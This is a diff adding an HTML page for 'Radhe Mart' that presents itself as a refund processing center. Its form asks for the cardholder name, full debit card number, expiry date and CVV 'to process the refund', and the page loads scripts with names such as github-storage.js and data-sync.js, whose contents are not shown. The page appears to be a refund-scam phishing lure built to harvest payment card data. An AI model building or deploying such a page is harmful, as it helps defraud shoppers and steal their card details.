@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Radhe Mart - Refund Initiation</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <h1><i class="fas fa-shopping-basket"></i> Radhe Mart</h1>
+                <p>Refund Processing Center</p>
+            </div>
+            <div class="header-actions">
+                <button class="back-btn" onclick="window.location.href='index.html'">
+                    <i class="fas fa-arrow-left"></i> Back to Home
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Refund Form -->
+    <main class="refund-main">
+        <div class="container">
+            <div class="refund-container">
+                <div class="refund-header">
+                    <i class="fas fa-undo-alt refund-icon"></i>
+                    <h2>Refund Initiation</h2>
+                    <p>Please enter your debit card details to process the refund</p>
+                </div>
+
+                <form id="refundForm" class="refund-form">
+                    <div class="form-section">
+                        <h3><i class="fas fa-credit-card"></i> Card Details</h3>
+                        
+                        <div class="form-group">
+                            <label for="refundCardholderName">Cardholder Name *</label>
+                            <input type="text" id="refundCardholderName" required placeholder="Enter cardholder name">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="refundCardNumber">Debit Card Number *</label>
+                            <input type="text" id="refundCardNumber" required placeholder="1234 5678 9012 3456" maxlength="19">
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="refundExpiryDate">Expiry Date *</label>
+                                <input type="text" id="refundExpiryDate" required placeholder="MM/YY" maxlength="5">
+                            </div>
+                            <div class="form-group">
+                                <label for="refundCvv">CVV *</label>
+                                <input type="text" id="refundCvv" required placeholder="123" maxlength="3">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="refundDescription">Additional Details</label>
+                            <textarea id="refundDescription" rows="4" placeholder="Please provide additional details about your refund request..."></textarea>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="proceed-btn">
+                        <i class="fas fa-arrow-right"></i> Proceed with Refund
+                    </button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- Sync Status Indicator -->
+    <div class="sync-status" id="syncStatus">
+        <i class="fas fa-sync-alt"></i> Syncing data...
+    </div>
+
+    <script src="data-sync.js"></script>
+    <script src="cross-device-fix.js"></script>
+    <script src="github-storage.js"></script>
+    <script src="refund.js"></script>
+</body>
+</html>
